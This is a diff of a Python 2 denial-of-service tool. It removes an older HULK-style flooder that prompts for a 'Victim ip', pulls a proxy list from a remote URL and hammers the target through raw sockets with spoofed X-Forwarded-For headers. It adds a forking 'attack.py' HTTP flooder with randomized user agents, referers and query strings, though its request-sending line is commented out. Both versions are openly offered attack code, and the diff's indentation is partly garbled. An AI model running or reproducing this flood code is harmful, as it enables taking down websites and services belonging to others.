@@ -3669,31 +3669,8 @@ def keyword_list():
         keyword_top.append('Treatment')
         keyword_top.append('Cord Blood')
 	return(keyword_top)
-
-def buildblock(size):
-	out_str = ''
-	for i in range(0, size):
-		a = random.randint(65, 90)
-		out_str += chr(a)
-	return(out_str)
-
-def httpcall(url):
-	referer_list()
-	Mod=0
-	if url.count("?")>0:
-		param_joiner = "&"
-	else:
-		param_joiner = "?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', getUserAgent())
-	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + host + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
-	request.add_header('Connection', 'keep-alive')
-	request.add_header('Host',host)
 	
-	print \
+print \
 """
 
                   /\    
@@ -3747,151 +3724,156 @@ def httpcall(url):
 """""""""
 		 
 
-	index = random.randint(0,len(listaproxy)-1)
-	proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
-	opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
-	urllib2.install_opener(opener)	
-	try:
-			urllib2.urlopen(request)
-			if(flag==1): set_flag(0)
-			if(Mod==500): Mod=0
-	except urllib2.HTTPError, e:
-			set_flag(1)
-			Mod=500
-			time.sleep(60)
-	except urllib2.URLError, e:
-			sys.exit()
+	def usage():
+	# print ''' usage : python attack.py [-t] [-c] http://www.zhihu.com/
+	# -h : help
+	# -t : lasting time of ddos
+	# -c : numbers of thread to create'''
+
+	sys.exit()
+
+# generates a user agent array
+def useragent_list():
+	global headers_useragents
+	headers_useragents = []
+	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	return(headers_useragents)
+
+# generates a referer array
+def referer_list():
+	global headers_referers
+	headers_referers = []
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://' + host + '/')
+	return(headers_referers)
+
+def handler(signum,_):
+	# if signum == signal.SIGALRM:
+		# print 'Time is up'
+		# print 'Attack finished '
+	sys.exit()
+
+#builds random ascii string
+def buildblock(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(65, 90)
+		out_str += chr(a)
+	return(out_str)
+
+def send_packet(host,param_joiner):
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request.add_header('User-Agent', random.choice(headers_useragents))
+	request.add_header('Cache-Control', 'no-cache')
+	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Connection', 'keep-alive')
+	request.add_header('Host',host)
+	# try:
+	# 	response = urllib2.urlopen(request)
+	# except urllib2.HTTPError, error:
+	# 	pass
+	# except urllib2.URLError, error:
+	# 	pass
+#	print "response code = %d "%response.code
+
+def attack(host,param_joiner):
+	while True:
+		send_packet(host,param_joiner)
+
+def parse_parameters(parameters):
+
+	global url
+	global interval
+	global num_thread
+	interval_def = 30
+	num_thread_def = 5
+	interval = interval_def
+	num_thread = num_thread_def	
+	try :
+		opts,args = getopt.getopt(parameters,"ht:c:",["help"])
+		url = args[0]
+		for opt,arg in opts:
+			if opt in ('-h','--help'):
+				usage()
+			elif opt in ('-t','--time'):
+				if arg.isalnum():
+					interval = arg
+				else:
+					usage()
+			elif opt in ('-c','--count'):
+				if arg.isalnum():
+					num_thread = arg
+				else:
+					usage()
+	except getopt.GetoptError:  
+		print("getopt error!");  
+		usage();  
+		sys.exit(1);
+
+if __name__ == '__main__':
+	if len(sys.argv) < 2:
+		usage()
+		sys.exit()
+	parse_parameters(sys.argv[1:])
+	print ("Debug : thread=%d time=%d %s"%(int(num_thread),int(interval),url))
+	if url.count('/') == 2:
+		url = url + "/"
+	m = re.search('http\://([^/]*)/?.*', url)
+	try :
+		host = m.group(1)
+	except AttributeError as e:
+		usage()
+		sys.exit()
+
+	useragent_list()
+	referer_list()
+
+	if url.count("?") > 0:
+		param_joiner = "&"
 	else:
-			inc_counter()
-			urllib2.urlopen(request)
-	return(Mod)
+		param_joiner = "?"
+	
+	signal.signal(signal.SIGINT, handler)
+	signal.signal(signal.SIGALRM, handler)
+	signal.alarm(int(interval))
 
-class HTTPThread(threading.Thread):
-	def run(self):
-		try:
-			while flag<2:
-				Mod=httpcall(url)
-				if (Mod==500) & (safe==1):
-					set_flag(2)
-		except Exception, ex:
-			pass
+	for i in range(int(num_thread)):
+		newpid = os.fork()
+		if newpid == 0:
+#			signal.signal(signal.SIGINT, signal.SIG_DFL)
+			attack(host,param_joiner)
+		else:
+			pass 
+#			print ("Child process",os.getpid(),newpid)
+	time.sleep(int(interval))
+	signal.alarm(0)
+	print ("main thread exit...")
 
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				previous=request_counter
-			if flag==2:
-				print ''
 
-#Hulk Fucked By CheXanh :v
-def randomIp():
-    random.seed()
-    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
-    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
-    return result
+# 	ddos
+# ====
 
-def randomIpList():
-    random.seed()
-    res = ""
-    for ip in xrange(random.randint(2, 8)):
-        res = res + randomIp() + ", "
-    return res[0:len(res) - 2]
-class attacco(threading.Thread):
-    def run(self):
-    	referer_list()
-        current = x
-       
-        if current < len(listaproxy):
-            proxy = listaproxy[current].split(':')
-        else:
-            proxy = random.choice(listaproxy).split(':')
- 
-        useragent = "User-Agent: " + getUserAgent() + "\r\n"
-        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
-        referer   = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 1000)) +  "\r\n"
-        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
+# DDOS tool in python.
 
-        while nload:
-        	time.sleep(1)
-        	pass
-           
-        while 1:
-            try:
-                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                a.connect((proxy[0], int(proxy[1])))
-                a.send(httprequest)
-                try:
-                    for i in xrange(4):
-                        a.send(httprequest)
-                except:
-                    tts = 1
-                    
-            except:
-                proxy = random.choice(listaproxy).split(':')
+# =============== usage =============
 
-class attacco1(threading.Thread):
-    def run(self):
-        current = x
-       
-        if current < len(listaproxy):
-            proxy = listaproxy[current].split(':')
-        else:
-            proxy = random.choice(listaproxy).split(':')
- 
-        useragent = "User-Agent: " + getUserAgent() + "\r\n"
-        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
-        httprequest = get_host + useragent + accept + forward + connection + "\r\n"
+# python attack.py [option] http://www.firefoxbug.net/
 
-        while nload:
-        	time.sleep(1)
-        	pass           
-        while 1:
-            try:
-                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                a.connect((proxy[0], int(proxy[1])))
-                a.send(httprequest)
-                try:
-                    for i in xrange(4):
-                        a.send(httprequest)
-                except:
-                    tts = 1 
-                   
-            except:
-                proxy = random.choice(listaproxy).split(':')
+#     -h : help
 
-#Main
-print '\n\t..:: > By Xsarjame :v < ::..'
-print '\t  ==> #~~ Assasin trea ddos ~~# <==  '
-# Site
-url = raw_input("Victim ip: ")
-host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
-#Proxy
-proxyf = urllib.urlopen("https://350adf0c87a0387a8100df99cb67bc325c711efb.googledrive.com/host/0B03s85BjEAHVfkpJaVZKdDFnQ25VTEJsZE5FMzhwUjBOa1VLUFdtRDhSR01qenZ1M1hZMWs/yyy.txt").read()
-listaproxy = proxyf.split('\n')
-#So luong
-thread = input("So luong (3000): ")
-get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
-accept = "Accept-Encoding: gzip, deflate\r\n"
-connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
-nload = 1
-x = 0
-print("\tAssasain trea DDOS Attack By xsarjame :v")
-if url.count("/")==2:
-    url = url + "/"
-    m = re.search('http\://([^/]*)/?.*', url)
-    host = m.group(1)
-for x in xrange(int(thread + 1)):
-    attacco().start()
-    attacco1().start()
-    time.sleep(0.002)
-print "startAttacking..."
-for x in xrange(501):
-	t = HTTPThread()
-	t.start()
-t = MonitorThread()
-t.start()
-nload = 0
-while not nload:
-    time.sleep(1)
+#     -t : lasting time of ddos
+
+#     -c : numbers of thread to create
